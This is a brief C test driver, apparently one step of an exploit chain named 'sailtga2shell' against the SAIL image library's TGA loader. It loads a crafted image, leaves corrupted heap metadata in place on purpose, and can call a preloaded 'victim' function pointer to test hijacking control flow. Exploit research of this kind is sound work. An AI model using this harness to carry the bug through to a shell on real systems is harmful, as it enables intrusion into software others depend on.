/* sailtga2shell w1 — load the local TGA through the real public file API.
 * Deliberately does not destroy the image: the corrupted metadata past the
 * pixel allocation is not freed, matching the inherited rung-4 condition.
 * If SAIL_VICTIM_CALL=1, calls the preloaded victim's pointer field once. */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <sail/sail.h>

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "usage: pointer-driver FILE.tga\n");
        return 2;
    }
    struct sail_image *image = NULL;
    sail_status_t st = sail_load_from_file(argv[1], &image);
    printf("rc=%d pixels=%p\n", (int)st, (void *)(image != NULL ? image->pixels : NULL));

    const char *call = getenv("SAIL_VICTIM_CALL");
    if (call != NULL && call[0] == '1') {
        void (*victim_call)(void) = (void (*)(void))dlsym(RTLD_DEFAULT, "victim_call");
        if (victim_call != NULL) {
            victim_call();
        }
    }
    return 0;
}
